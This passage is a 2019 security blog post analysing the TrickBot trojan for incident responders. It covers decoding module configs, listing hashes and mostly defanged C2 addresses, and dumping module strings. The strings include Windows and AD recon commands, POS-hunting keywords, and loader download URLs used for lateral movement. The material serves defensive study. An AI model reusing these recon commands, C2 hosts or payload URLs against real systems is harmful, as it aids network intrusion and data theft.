<!DOCTYPE html>
<html lang="en">
<head>

    <title>TRICKBOT ANALYSIS</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=7ce45ed6c5" />

    <meta name="description" content="TRICKBOT config decode and analysis using   Hasherades scripts, FLOSS, CyberChef, Process Hacker" />
    <link rel="canonical" href="https://sneakymonkey.net/trickbot-analysis/" />
    <meta name="referrer" content="no-referrer-when-downgrade" />
    <link rel="amphtml" href="https://sneakymonkey.net/trickbot-analysis/amp/" />
    
    <meta property="og:site_name" content="you sneakymonkey!" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content="TRICKBOT ANALYSIS" />
    <meta property="og:description" content="Research into how to decode the TRICKBOT config, quickly analyse to provide context and help incident response/blue teams." />
    <meta property="og:url" content="https://sneakymonkey.net/trickbot-analysis/" />
    <meta property="og:image" content="https://sneakymonkey.net/content/images/2019/05/tumblr_o16n2kBlpX1ta3qyvo1_1280_jpg__1024-768_.png" />
    <meta property="article:published_time" content="2019-05-22T13:25:43.000Z" />
    <meta property="article:modified_time" content="2019-05-22T17:32:03.000Z" />
    <meta property="article:tag" content="trickbot" />
    <meta property="article:tag" content="blueteam" />
    
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Config &amp; Module Analysis" />
    <meta name="twitter:description" content="Research into how to decode the TRICKBOT config, quickly analyse to provide context and help incident response/blue teams." />
    <meta name="twitter:url" content="https://sneakymonkey.net/trickbot-analysis/" />
    <meta name="twitter:image" content="https://sneakymonkey.net/content/images/2019/05/tumblr_o16n2kBlpX1ta3qyvo1_1280_jpg__1024-768_.png" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="Mark R" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="trickbot, blueteam" />
    <meta name="twitter:site" content="@sneakymonk3y" />
    <meta property="og:image:width" content="1504" />
    <meta property="og:image:height" content="1132" />
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "you sneakymonkey!",
        "url": "https://sneakymonkey.net/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://sneakymonkey.net/content/images/2016/06/monkey.jpg",
            "width": 60,
            "height": 60
        }
    },
    "author": {
        "@type": "Person",
        "name": "Mark R",
        "image": {
            "@type": "ImageObject",
            "url": "https://sneakymonkey.net/content/images/2022/12/thisisfine.jpeg",
            "width": 300,
            "height": 300
        },
        "url": "https://sneakymonkey.net/author/mark/",
        "sameAs": []
    },
    "headline": "TRICKBOT ANALYSIS",
    "url": "https://sneakymonkey.net/trickbot-analysis/",
    "datePublished": "2019-05-22T13:25:43.000Z",
    "dateModified": "2019-05-22T17:32:03.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://sneakymonkey.net/content/images/2019/05/tumblr_o16n2kBlpX1ta3qyvo1_1280_jpg__1024-768_.png",
        "width": 1504,
        "height": 1132
    },
    "keywords": "trickbot, blueteam",
    "description": "Research into how to decode the TRICKBOT config, quickly analyse to provide context and help incident response/blue teams.",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://sneakymonkey.net/"
    }
}
    </script>

    <meta name="generator" content="Ghost 5.26" />
    <link rel="alternate" type="application/rss+xml" title="you sneakymonkey!" href="https://sneakymonkey.net/rss/" />
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="38850265b67e545885c8a33127" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://sneakymonkey.net/" crossorigin="anonymous"></script>
    <script defer src="/public/cards.min.js?v=7ce45ed6c5"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=7ce45ed6c5">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.css" integrity="sha512-LQ97camar/lOliT/MqjcQs5kWgy6Qz/cCRzzRzUCfv0fotsCTC9ZHXaPQmJV8Xu/PVALfJZ7BDezl5lW3/qBxg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-coy.min.css" integrity="sha512-LOT5F67SMZVdXMrvQe4S1ZHu5l6xk3CST2qqno9kY329OsJBBpybnq+fM9qG4ZSaNzPOjoGzHAeBamSSJyyuZg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.css" integrity="sha512-xR1GkZTTI6W9EbZMOEKxRh5TYhZGIuxOMyVaqPd0/qU4QRGUyxgVdeBTAzsQPaBlLoiHSo/dTQIKLHCtG+se6w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-highlight/prism-line-highlight.css" integrity="sha512-0zp7BW2vyZS5TN6hhfLMYwK0EDS6W7zXKfwnLkdjDQ8YknfuSITZCrJTnNOo1VBqesTMapwc46vvCvyPqlfOug==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/toolbar/prism-toolbar.min.css" integrity="sha512-Dqf5696xtofgH089BgZJo2lSWTvev4GFo+gA2o4GullFY65rzQVQLQVlzLvYwTo0Bb2Gpb6IqwxYWtoMonfdhQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-B6CVXQYLCG"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-B6CVXQYLCG');
</script><style>:root {--ghost-accent-color: #393737;}</style>

</head>
<body class="post-template tag-trickbot tag-blueteam tag-hash-import-2022-12-30-14-34 is-head-left-logo has-sans-body has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo" href="https://sneakymonkey.net">
                        <img src="https://sneakymonkey.net/content/images/2016/06/monkey.jpg" alt="you sneakymonkey!">
                </a>
                <button class="gh-search gh-icon-btn" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-127-0-0-1"><a href="https://www.sneakymonkey.net">127.0.0.1</a></li>
    <li class="nav-blue-team-tips"><a href="https://sneakymonkey.net/blue-team-tips/">Blue Team Tips</a></li>
    <li class="nav-offensive"><a href="https://www.sneakymonkey.net/tag/oscp/">Offensive</a></li>
    <li class="nav-defensive"><a href="https://www.sneakymonkey.net/tag/blueteam/">Defensive</a></li>
    <li class="nav-github"><a href="https://github.com/sneakymonk3y">Github</a></li>
    <li class="nav-my-feedly"><a href="https://feedly.com/sneakymonkey">My Feedly</a></li>
    <li class="nav-cv"><a href="https://www.markrobinson.me">CV</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-trickbot tag-blueteam tag-hash-import-2022-12-30-14-34 ">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/trickbot/">trickbot</a>
                </span>
        </div>

        <h1 class="article-title">TRICKBOT - Analysis</h1>

            <p class="article-excerpt">Research into how to decode the TRICKBOT config, quickly analyse to provide context and help incident response/blue teams.</p>

        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list">
                <li class="author-list-item">
                    <a href="/author/mark/" class="author-avatar">
                        <img class="author-profile-image" src="/content/images/size/w100/2022/12/thisisfine.jpeg" alt="Mark R" />
                    </a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/mark/">Mark R</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2019-05-22">May 22, 2019</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 19 min read</span>
                </div>
            </div>

        </section>
        </div>

            <figure class="article-image">
                <img
                    srcset="/content/images/size/w300/2019/05/tumblr_o16n2kBlpX1ta3qyvo1_1280_jpg__1024-768_.png 300w,
                            /content/images/size/w600/2019/05/tumblr_o16n2kBlpX1ta3qyvo1_1280_jpg__1024-768_.png 600w,
                            /content/images/size/w1000/2019/05/tumblr_o16n2kBlpX1ta3qyvo1_1280_jpg__1024-768_.png 1000w,
                            /content/images/size/w2000/2019/05/tumblr_o16n2kBlpX1ta3qyvo1_1280_jpg__1024-768_.png 2000w"
                    sizes="(min-width: 1400px) 1400px, 92vw"
                    src="/content/images/size/w2000/2019/05/tumblr_o16n2kBlpX1ta3qyvo1_1280_jpg__1024-768_.png"
                    alt="TRICKBOT - Analysis"
                />
            </figure>

    </header>

    <section class="gh-content gh-canvas">
        <!--kg-card-begin: markdown--><p>TRICKBOT is an info-stealer/banking trojan which is currently under active development and has various modules to grab credentials, move laterally, steal data and provide remote access.</p>
<p>I recently spent sometime walking through this so I've compiled a few tools/techniques out there to decode and analyse each of the TRICKBOT modules - <strong>its super simple and very effective!</strong> The idea here is to provide awareness, help with detections and aid incident response. I'm no reverse engineer but I get enough done to produce a few IOCs and some basic understanding of it's functionality to scope response. It's all about that context! üòâ</p>
<p><img src="https://sneakymonkey.net/content/images/2019/05/reversing.jpg" alt="reversing" loading="lazy"></p>
<p>I can see where a lot of the OSINT reports on TRICKBOT are compiled from now. Another post can be made on the original infection vector, created persistence, removal and other network related IOCs from PCAP data.</p>
<h2 id="tooling">Tooling</h2>
<ul>
<li>If you don't already have an active infected host, download the @malware_traffic <a href="https://www.malware-traffic-analysis.net/2019/04/27/index.html">2019-04-27 TRICKBOT SAMPLE</a> üëçüëçüëç</li>
<li><strong>Python 2.7</strong> + pip + easy_install pycrypt ‚úî‚úî‚úî</li>
<li>@hasherezade <strong>TRICKBOT BOTKEY üîë creator</strong> (<a href="https://goo.gl/7Sf1E1">exe</a>) (<a href="https://github.com/hasherezade/malware_analysis/blob/master/trickbot/make_bot_key.cpp">source</a>) 32E1293B4B5B212342C131E11B07B4B501DAFCEBB9B3E6B19CC738D7F4571498</li>
<li>@hasherezade <strong>TRICKBOT AES config decoder</strong> (<a href="https://github.com/hasherezade/malware_analysis/tree/master/trickbot">source</a>)</li>
<li>FireEye Labs Obfuscated String Solver (FLOSS) - strings analysis. <a href="https://github.com/fireeye/flare-floss">https://github.com/fireeye/flare-floss</a></li>
<li>CyberChef for extracting URLs/domains/IPs, sorting, filtering, defanging etc.. <a href="https://gchq.github.io/CyberChef/#recipe=Extract_URLs(false)Defang_URL(true,true,true,'Valid%20domains%20and%20full%20URLs')">https://gchq.github.io/CyberChef/#recipe=Extract_URLs(false)Defang_URL(true,true,true,'Valid domains and full URLs')</a></li>
</ul>
<p>Once you have those downloaded, its just as easy as follows;</p>
<h2 id="steps">Steps</h2>
<p>1Ô∏è‚É£ Run the BOTKEY retrieval on the <strong>infected</strong> host.<br>
<img src="https://sneakymonkey.net/content/images/2019/05/botkey.png" alt="botkey" loading="lazy"></p>
<p>2Ô∏è‚É£ Once you have that, specify and decode.<br>
<code>config_decode.py --botkey {KEY} --datafile C:\Users\USER\AppData\Roaming\gpuDriver\Data\pwgrab64</code><br>
This will dump the decypted .dll ready for analysis. Do this for each module. Repeat this step for the config files in the module named folders.</p>
<iframe src="https://giphy.com/embed/5VKbvrjxpVJCM" width="480" height="384" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/5VKbvrjxpVJCM">via GIPHY</a></p>
<p>3Ô∏è‚É£ Run through with FLOSS and redirect to an output file if needed <code>floss32.exe C:\Users\USER\AppData\Roaming\gpuDriver\Data\MODULE.dll &gt; MODULE.txt</code></p>
<p>These are the updated versions I was playing with on my infected host.<br>
TRICKBOT Modules 19052019.</p>
<p><img src="https://sneakymonkey.net/content/images/2019/05/decode-1.png" alt="decode-1" loading="lazy"><br>
Configuration Location:</p>
<ul>
<li><code>C:\Users\*\AppData\Roaming\gpuDriver\Data\*</code><br>
(<code>%APPDATA%\gpuDriver\Data\</code>)</li>
</ul>
<h2 id="modulesha256hashes">Module SHA256 Hashes</h2>
<pre><code>importDll64.dll	844974A2D3266E1F9BA275520C0E8A5D176DF69A0CCD5135B99FACF798A5D209	
injectDll64.dll	8C5C0D27153F60EF8AEC57DEF2F88E3D5F9A7385B5E8B8177BAB55FA7FAC7B18	
mailsearcher64.dll 9CFB441EB5C60AB1C90B58D4878543EE554ADA2CCEEE98D6B867E73490D30FEC
networkDll64.dll BA2A255671D33677CAB8D93531EB25C0B1F1AC3E3085B95365A017463662D787
NewBCtestDll64.dll BF38A787AEE5AFDCAB00B95CCDF036BC7F91F07151B4444B54165BB70D649CE5
psfin64.dll 8CD75FA8650EBCF0A6200283E474A081CC0BE57307E54909EE15F4D04621DDE0
pwgrab64.dll 1E90A73793017720C9A020069ED1C87879174C19C3B619E5B78DB8220A63E9B7
shareDll64.dll 05EF40F7745DB836DE735AC73D6101406E1D9E58C6B5F5322254EB75B98D236A	
systeminfo64.dll 083CB35A7064AA5589EFC544AC1ED1B04EC0F89F0E60383FCB1B02B63F4117E9
vncDll64.dll DBD534F2B5739F89E99782563062169289F23AA335639A9552173BEDC98BB834
wormDll64.dll D5BB8D94B71D475B5EB9BB4235A428563F4104EA49F11EF02C8A08D2E859FD68	
</code></pre>
<h1 id="stringanalysis">String Analysis</h1>
<p>Just to give a rough understanding for each modules output I've dumped interesting strings. Most of the output seen here matches the OSINT reports I've read. TRICKBOT's core modules at the time of writing;</p>
<ul>
<li>systeminfo64</li>
<li>networkDll64</li>
<li>psfin64</li>
<li>wormDll64</li>
<li>sharedll64</li>
<li>pwgrab64</li>
<li>injectDll64</li>
<li>importDll64</li>
<li>vncDll64</li>
<li>newBCtestDll64</li>
</ul>
<p>Also of note: there is the main configuration file at <code>C:\Users\*\AppData\Roaming\gpuDriver\Data\settings.ini</code> but I was unable to decode via the scripts from hasherade's repo - more reversing/unpacking is needed and will save that for another post. Using Process Hacker to analyse the hollowed out the SVCHOST process memory you can see similar results anyway:</p>
<p><img src="https://sneakymonkey.net/content/images/2019/05/procmon.png" alt="procmon" loading="lazy"></p>
<p>I had previously captured a bigger list upon process start up and saved that which provides more connections (probably downloading the latest config verison?):</p>
<pre><code>0x12f6f50 (14): 5[.]190[.]90[.]5:449
0x1312560 (18): 37[.]255[.]200[.]157:449
0x1312590 (16): 91[.]98[.]159[.]58:449
0x13125c0 (18): 190[.]215[.]52[.]165:449
0x13125f0 (18): 85[.]133[.]183[.]174:449
0x1312620 (16): 2[.]184[.]90[.]173:449
0x1312650 (16): 31[.]47[.]55[.]106:449
0x1312680 (18): 94[.]101[.]182[.]156:449
0x13126b0 (18): 93[.]115[.]146[.]119:449
0x13126e0 (17): 201[.]56[.]193[.]18:449
0x1312710 (18): 177[.]92[.]249[.]187:449
0x1312740 (18): 187[.]61[.]106[.]223:449
0x1312770 (18): 187[.]61[.]107[.]140:449
...
</code></pre>
<p>See bottom for more IOCs.</p>
<p>Also, analyse Wireshark/PCAP data for the User-Agent it uses when POSTing back data from the infected host.</p>
<pre><code>POST /ono1/WINDOWS7_W617601.0CE242D310E5CDC6F2CB8132FBD9B404/83/ HTTP/1.1
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)
Host: 186.159.1.217
</code></pre>
<p>Quickly quering those C2 addresses, most seem to have a commonality of MikroTik based devices - either that or Shodan is misrepresenting that port. Further digging can be done later on this.</p>
<pre><code>Ports:
     21/tcp MikroTik router ftpd (6.43.2)
   2000/tcp MikroTik bandwidth-test server
   8080/tcp MikroTik http proxy
Ports:
     21/tcp MikroTik router ftpd (6.42.5)
   2000/tcp MikroTik bandwidth-test server
   8080/tcp MikroTik http proxy
Ports:
   2000/tcp MikroTik bandwidth-test server
Ports:
     21/tcp MikroTik router ftpd (6.43.12)
   2000/tcp MikroTik bandwidth-test server
   8080/tcp MikroTik http proxy
Ports:
     21/tcp MikroTik router ftpd (6.40.4)
   2000/tcp MikroTik bandwidth-test server
</code></pre>
<p>Back to the string analysis of the TRICKBOT modules...</p>
<h2 id="systeminfo64">systeminfo64</h2>
<p>Basic information on the host. Noticed the registry key lookup to gather installed applications aswell as WMI queries.</p>
<pre><code>SELECT * FROM Win32_OperatingSystem
SELECT * FROM Win32_Processor
SELECT * FROM Win32_ComputerSystem
SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

u&quot;SELECT * FROM Win32_OperatingSystem&quot;
u&quot;CSDVersion&quot;
u&quot;SELECT * FROM Win32_Processor&quot;
u&quot;&lt;cpu&gt;%s&lt;/cpu&gt;\r\n&quot;
u&quot;SELECT * FROM Win32_ComputerSystem&quot;
u&quot;&lt;ram&gt;%s&lt;/ram&gt;\r\n&quot;
u&quot;&lt;users&gt;\r\n&quot;
u&quot;&lt;user&gt;%s&lt;/user&gt;\r\n&quot;
u&quot;&lt;/users&gt;\r\n&quot;
u&quot;DisplayName&quot;
u&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall&quot;
u&quot;&lt;installed&gt;\r\n&quot;
u&quot;DisplayName&quot;
u&quot;&lt;program&gt;%s&lt;/program&gt;\r\n&quot;
u&quot;&lt;/installed&gt;\r\n&quot;
u&quot;DisplayName&quot;
u&quot;DisplayName&quot;
u&quot;&lt;service&gt;%s&lt;/service&gt;\r\n&quot;
</code></pre>
<h2 id="networkdll64">networkDll64</h2>
<p>Gathers system information and network/domain topology - you can see what is being leaked. Seems to be enumerating or looking for Administrative accounts which is all then reported back to the C2.</p>
<pre><code>***SYSTEMINFO***
ROOT\CIMV2 SELECT * FROM Win32_OperatingSystem
CSName
Caption
CSDVersion
OSArchitecture
ProductType
BuildType
WindowsDirectory
SystemDirectory
BootDevice
SerialNumber
InstallDate
LastBootUpTime
RegisteredUser
Organization
TotalVisibleMemorySize
FreePhysicalMemory
Host Name - %s
OS Name - %s
OS Version - %s
OS Architecture - %s
Product Type - Workstation
Product Type - Domain Controller
Product Type - Server
Build Type - %s
Registered Owner - %s
Registered Organization - %s
Serial Number - %s
Install Date - %02u/%02u/%04u %02d.%02d.%02d
Last Boot Up Time - %02u/%02u/%04u %02d.%02d.%02d
Windows Directory - %s
System Directory - %s
Boot Device - %s
Total Physical Memory - %d Mb
Available Physical Memory - %d Mb
        ***PROCESS LIST***
{001677D0-FD16-11CE-ABC4-02608C9E7553}
{00020404-0000-0000-C000-000000000046}
{109BA8EC-92F0-11D0-A790-00C04FD8D5A8}
dNSHostName
description
sAMAccountName
mail
comment
E-mail: %s
(&amp;(objectcategory=person)(samaccountname=%s))
Admin Name: %s
Admin E-mail: %s
(&amp;(objectcategory=person)(mail=*))
(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))
List of domains:
LDAP://%s
Administrator
Administrateur
Riarth
Amministratore
Adminisztr
Administr
rnandi
Administrators
Administratorius
Hallintomies
Administrat
Administraator
Administrador
netici
		***LOCAL MACHINE DATA***
User name: %s
Computer name: %s
Site name: %s
Domain shortname: %s
Domain name: %s
Forest name: %s
Domain controller: %s
Forest trees:
	%d %s
/%s/%s/90
Content-Type: multipart/form-data; boundary=%s
test
POST
--%s
Content-Disposition: form-data; name=&quot;proclist&quot;
--%s
Content-Disposition: form-data; name=&quot;sysinfo&quot;
--%s--
&lt;moduleconfig&gt;&lt;needinfo name=&quot;id&quot;/&gt;&lt;needinfo name=&quot;ip&quot;/&gt;&lt;autoconf&gt;&lt;conf ctl=&quot;SetConf&quot; file=&quot;dpost&quot; period=&quot;1440&quot;/&gt;&lt;/autoconf&gt;&lt;/moduleconfig&gt;
\cmd.exe
		%s
SendReport
Report successfully sent
Dpost servers unavailable
/c ipconfig /all
/c net config workstation
/c net view /all
/c net view /all /domain
/c nltest /domain_trusts
/c nltest /domain_trusts /all_trusts
</code></pre>
<p>Decoded 'dpost' config C:\Users*\AppData\Roaming\gpuDriver\Data\networkDll64_configs</p>
<pre><code class="language-xml">&lt;dpost&gt;
&lt;handler&gt;hxxp[://]75[.]183[.]130[.]158:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]186[.]10[.]243[.]70:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]75[.]183[.]130[.]158:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]186[.]183[.]151[.]194:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]181[.]129[.]160[.]10:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]181[.]115[.]156[.]218:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]200[.]21[.]51[.]30:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]36[.]91[.]93[.]114:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]97[.]87[.]127[.]198:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]190[.]152[.]125[.]162:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]185[.]117[.]73[.]140:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]185[.]183[.]97[.]37:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]85[.]209[.]162[.]148:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]192[.]210[.]152[.]190:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]185[.]183[.]96[.]219:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]185[.]244[.]150[.]148:443&lt;/handler&gt;
&lt;/dpost&gt;
</code></pre>
<h2 id="psfin64">psfin64</h2>
<p>Point-of-Sale 'recon' module. These are high end targets to steal financial details from, think tills, kiosks, payment terminals. Pro-actively finding and securing these in your environment could help prevent further damage - patch, use unique local Administrative credentials, segregate (VLAN/FW), disabled ADMIN$ shares etc. You can see the keyword searches via LDAP/AD.</p>
<pre><code>&quot;&lt;moduleconfig&gt;&lt;needinfo name=\&quot;id\&quot;/&gt;&lt;needinfo name=\&quot;ip\&quot;/&gt;&lt;autoconf&gt;&lt;conf ctl=\&quot;SetConf\&quot; file=\&quot;dpost\&quot; period=\&quot;14400\&quot;/&gt;&lt;/autoconf&gt;&lt;/moduleconfig&gt;&quot;
u&quot;{001677D0-FD16-11CE-ABC4-02608C9E7553}&quot;
u&quot;{00020404-0000-0000-C000-000000000046}&quot;
u&quot;{109BA8EC-92F0-11D0-A790-00C04FD8D5A8}&quot;
u&quot;(&amp;(objectCategory=computer)(dNSHostName=%s))&quot;
u&quot;(&amp;(objectCategory=person)(sAMAccountName=%s))&quot;
u&quot;(&amp;(objectCategory=group)(sAMAccountName=%s))&quot;
u&quot;(&amp;(objectCategory=site)(name=%s))&quot;
u&quot;(&amp;(objectcategory=organizationalUnit)(name=%s))&quot;
u&quot;(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))&quot;
u&quot;DOMAIN GC\r\n&quot;
u&quot;---------------------------------------------------------------\r\n&quot;
u&quot;COMPUTERS:\r\n&quot;
u&quot;*POS*&quot;
u&quot;POS found: %d\r\n&quot;
u&quot;*REG*&quot;
u&quot;REG found: %d\r\n&quot;
u&quot;*CASH*&quot;
u&quot;CASH found: %d\r\n&quot;
u&quot;*LANE*&quot;
u&quot;LANE found: %d\r\n&quot;
u&quot;*STORE*&quot;
u&quot;STORE found: %d\r\n&quot;
u&quot;*RETAIL*&quot;
u&quot;RETAIL found: %d\r\n&quot;
u&quot;*BOH*&quot;
u&quot;BOH found: %d\r\n&quot;
u&quot;*ALOHA*&quot;
u&quot;ALOHA found: %d\r\n&quot;
u&quot;*MICROS*&quot;
u&quot;MICROS found: %d\r\n&quot;
u&quot;*TERM*&quot;
u&quot;TERM found: %d\r\n\r\n&quot;
u&quot;USERS:\r\n&quot;
u&quot;GROUPS:\r\n&quot;
u&quot;SITES:\r\n&quot;
u&quot;OUs:\r\n&quot;
u&quot;---------------------------------------------------------------\r\n\r\n&quot;
u&quot;dNSHostName&quot;
u&quot;LDAP://%s&quot;
u&quot;DOMAIN %s\r\n&quot; 
u&quot;/%s/%s/90&quot;
u&quot;Content-Type: multipart/form-data; boundary=%s&quot;
&quot;SendReport&quot;
&quot;Report successfully sent&quot;
&quot;Dpost servers unavailable&quot;
u&quot;--%s\r\nContent-Disposition: form-data; name=\&quot;proclist\&quot;\r\n\r\n&quot;
u&quot;Empty\r\n&quot;
u&quot;--%s\r\n&quot;
u&quot;Content-Disposition: form-data; name=\&quot;sysinfo\&quot;\r\n\r\n&quot;
u&quot;--%s--\r\n\r\n&quot;
</code></pre>
<p>Decoded 'dpost' config C:\Users*\AppData\Roaming\gpuDriver\Data\psfin64_configs</p>
<pre><code class="language-xml">&lt;dpost&gt;
&lt;handler&gt;hxxp[://]75[.]183[.]130[.]158:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]186[.]10[.]243[.]70:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]75[.]183[.]130[.]158:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]186[.]183[.]151[.]194:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]181[.]129[.]160[.]10:8082&lt;/handler&gt;
&lt;handler&gt;hxxp[://]181[.]115[.]156[.]218:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]200[.]21[.]51[.]30:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]36[.]91[.]93[.]114:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]97[.]87[.]127[.]198:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]190[.]152[.]125[.]162:80&lt;/handler&gt;
&lt;handler&gt;hxxp[://]185[.]117[.]73[.]140:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]185[.]183[.]97[.]37:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]85[.]209[.]162[.]148:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]192[.]210[.]152[.]190:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]185[.]183[.]96[.]219:443&lt;/handler&gt;
&lt;handler&gt;hxxp[://]185[.]244[.]150[.]148:443&lt;/handler&gt;
&lt;/dpost&gt;
</code></pre>
<h2 id="wormdll64">wormDll64</h2>
<p>Downloads a .png (.exe) from <code>hxxp://54.38.127[.]23/worming.png</code> the TRICKBOT loader to prep for lateral movement. Also, checks to see if the host is in a domain or not by using LDAP queries. Seems to use <a href="https://attack.mitre.org/techniques/T1077/">lateral movment via shares T1077</a> using pysmb library.</p>
<blockquote>
<p>pysmb is an experimental SMB/CIFS library written in Python. It implements the client-side SMB/CIFS protocol (SMB1 and SMB2) which allows your Python application to access and transfer files to/from SMB/CIFS shared folders like your Windows file sharing and Samba folders.</p>
</blockquote>
<p>hxxp://54.38.127[.]23/worming.png<br>
clnProekto.exe	<br>
74E6723E9DC7126D4864DCBC41C6B5DAB7AD2A9F56D0C0F94593BA88BDCA1D58	<br>
<a href="https://urlhaus.abuse.ch/url/198254/">https://urlhaus.abuse.ch/url/198254/</a></p>
<pre><code>hxxp://54.38.127[.]23/worming.png
{001677D0-FD16-11CE-ABC4-02608C9E7553}
{00020404-0000-0000-C000-000000000046}
{109BA8EC-92F0-11D0-A790-00C04FD8D5A8}
name
(objectCategory=computer)
dNSHostName
(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))
		*****MACHINE IN DOMAIN*****
LDAP://%ls
		*****MACHINE IN WORKGROUP*****
SMBs
pysmb
SMBr
NT LM 0.12
SMBt
SMBs
SMBs
Windows 7
2008
Vista
Windows 5
2003
\\%s\IPC$
</code></pre>
<hr>
<h2 id="sharedll64">shareDll64</h2>
<p>Downloads the TRICKBOT loader, transfers over to ADMIN shares and creates <a href="https://attack.mitre.org/techniques/T1050/">persistence via services</a> using a naming convention from the list &quot;ControlInfoService&quot; etc - needs confirming. Also note the 'WormShare' function name.</p>
<p>Other OSINT analysis:</p>
<ul>
<li>This module appears to be meant to be used in tandem with the worm32Dll module to spread Trickbot across local networks and shares via ETERNALBLUE SMB exploit and LDAP queries. Creates a service with one of the names from the quoted list.</li>
<li>The Admin$ shares are used by Trickbot once it has brute forced the local administrator password. A file share server has an IPC$ share that Trickbot queries to get a list of all endpoints that connect to it.</li>
</ul>
<p>hxxp://54.38.127[.]23/radiance.png<br>
escaped.exe<br>
5E2CEFB701B743818728ABEDE5FED4956E3ADB69BF58A56C19F5118C415A93BC</p>
<pre><code>create service?
Open sc %d
Start sc 0x%x
Create sc 0x%x
hxxp://54.38.127[.]23/radiance.png
%s\C$\escaped.exe
ControlInfoService 
